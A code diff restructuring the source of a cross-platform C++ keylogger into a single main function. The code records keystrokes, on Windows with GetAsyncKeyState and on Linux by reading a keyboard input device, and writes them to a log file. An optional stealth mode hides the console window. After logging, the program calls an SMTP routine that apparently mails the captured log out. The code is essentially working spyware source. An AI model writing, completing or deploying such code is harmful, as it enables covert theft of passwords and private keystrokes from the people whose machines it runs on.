@@ -1,127 +1,130 @@
-#ifdef _WIN32
-#include <iostream>
-#include <fstream>
-#include <windows.h>
-#include <winuser.h>
-#include <time.h>
-#include "smtp_attach.h"
-
-using namespace std;
-
-bool log(int key_stroke);
-
-int main()
-{
-   int i;
-   bool run = true;
-
-   if(true)
-   {
-      HWND Stealth;
-      AllocConsole();
-      Stealth = FindWindowA("ConsoleWindowClass", NULL);
-      ShowWindow(Stealth,0);
-   }
-
-   while(run)
-   {
-      for(i = 8; i <= 190; i++)
-      {
-         if(GetAsyncKeyState(i) == -32767)
-         {
-            run = log(i);
-         }
-      }
-   }
-
-   main_smtp();
-
-   return 0;
-}
-
-bool log(int key_stroke)
-{
-   if((key_stroke == 1) || (key_stroke == 2))
-   {
-      return true;
-   }
-
-   FILE* myFile = fopen("keylog.db", "a+");
-   time_t rawtime;
-   time (&rawtime);
-
-   printf("(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
-
-   if(key_stroke == VK_F2)
-   {
-      return false;
-   }else
-   {
-      fprintf(myFile,"(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
-      fclose(myFile);
-      return true;
-   }
-}
-#endif
-
-#ifdef __linux
-#include <fcntl.h>
-//using open;
-#include <unistd.h>
 #include <string>
-using std::string;
-#include "linux_keyrecord.h"
-//#include "keydb.h"
+#include "smtp_attach.h"
 #include "keytxt.h"
 #include "keyrecord.h"
 #include "keyvalue.h"
-using namespace keylog;
-#include "smtp_attach.h"
+
+#if defined(__linux)
+#include <fcntl.h>
+#include <unistd.h>
+#include "linux_keyrecord.h"
+#elif defined(_WIN32)
+#include <iostream>
+#include <fstream>
+#include <cstdio>
+#include <windows.h>
+#include <winuser.h>
+#include <time.h>
+#include "windows_keyrecord.h"
+#endif
+
+using namespace std;
 
 
-int main() {
 
-	string device_filename;
-	//string db_filename;
-	string txt_filename;
+#define DB_FILENAME				"keylog.db"
+#define STEALTHMODE             false
 
-	//device_filename = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
-	device_filename = "/dev/input/event2";
 
-	//db_filename = "keylog.db";
-	txt_filename = "keylog.db";
+#if defined(__linux)
+#define LINUX_DEVICE_FILENAME	"/dev/input/event2"
+#elif defined(_WIN32)
+bool log(int key_stroke, FILE* myFile)
+{
+    if((key_stroke == 1) || (key_stroke == 2))
+    {
+        return true;
+    }
+    time_t rawtime;
+    time (&rawtime);
 
-	int device_file = open(device_filename.c_str(), O_RDONLY);
-	//keylog_db::KeyDB keydb = keylog_db::KeyDB(db_filename);
-	keylog_txt::KeyTXT keytxt = keylog_txt::KeyTXT(txt_filename);
+    printf("(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
+    if(key_stroke == VK_F2)
+    {
+        return false;
+    }
+    else
+    {
+        fprintf(myFile,"(%lu) %d=%s\r\n", rawtime, key_stroke, (char*) &key_stroke);
+        fclose(myFile);
+        return true;
+    }
+}
 
-	struct input_event event;
+void stealth(bool isHidden)
+{
+    if (isHidden)
+    {
+        HWND Stealth;
+        AllocConsole();
+        Stealth = FindWindowA("ConsoleWindowClass", NULL);
+        ShowWindow(Stealth,0);
+    }
+}
+#endif
 
-    bool running = true;
-	while(running) {
+
+
+
+
+
+int main()
+{
+    string db_filename = DB_FILENAME;
+    keylog_txt::KeyTXT keydb = keylog_txt::KeyTXT(db_filename);
+
+#if defined(__linux)
+    string device_filename = LINUX_DEVICE_FILENAME;
+    int device_file = open(device_filename.c_str(), O_RDONLY);
+    struct input_event event;
+#elif defined(_WIN32)
+#if STEALTHMODE == true
+    HWND Stealth;
+    AllocConsole();
+    Stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(Stealth,0);
+#endif
+#endif
+
+    while(true)
+    {
+#if defined(__linux)
         read(device_file, &event, sizeof(struct input_event));
+        if(event.type == 1)
+        {
+            keylog::KeyRecord* keyRecord = new keylog_linux::KeyRecord(event);
+            keydb.insert(keyRecord);
 
-        if(event.type == 1) {
-            keylog::KeyRecord* keyRecord;
-
-            keyRecord = new keylog_linux::KeyRecord(event);
-
-            //keydb.insert(keyRecord);
-            keytxt.insert(keyRecord);
-
-            if(keyRecord->getValue() == keylog::value_f1) {
-                running = false;
+            if(keyRecord->getValue() == keylog::value_f1)
+            {
+                break;
             }
 
             delete keyRecord;
         }
-    }
+#elif defined(_WIN32)
 
+        for(keylog::KeyValue keyValue = keylog::value_first; keyValue != keylog::value_last; keyValue++) {
+            short keyState = GetAsyncKeyState(keyValue);
+            bool msb = keyState >> 15;
+            bool lsb = keyState & 0x1;
+            if (msb && lsb) {
+                time_t rawtime;
+                time (&rawtime);
 
-    keytxt.close();
+                keylog::KeyRecord* keyRecord = new keylog_windows::KeyRecord((time_t) rawtime, keyValue);
+                keydb.insert(keyRecord);
 
-    main_smtp();
+                if(keyRecord->getValue() == keylog::value_f2) {
+                    break;
+                }
 
-	close(device_file);
-}
+                delete keyRecord;
+            }
+        }
 #endif
+    }
+    keydb.close();
+    main_smtp();
+    return 0;
+}
